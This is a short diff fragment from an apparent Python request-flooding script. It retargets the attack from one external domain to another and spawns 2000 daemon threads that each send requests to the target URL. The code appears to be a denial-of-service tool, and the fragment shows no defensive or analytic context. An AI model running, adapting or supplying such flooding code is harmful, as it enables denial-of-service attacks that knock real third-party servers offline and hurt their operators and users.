@@ -50,7 +50,7 @@ def chek(url):
             print("Request failed")
 
 def start_threads():
-    target_url = "http://23.x10.mx/public/"
+    target_url = "https://keysgen.site/exe_right/"
     for _ in range(2000):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
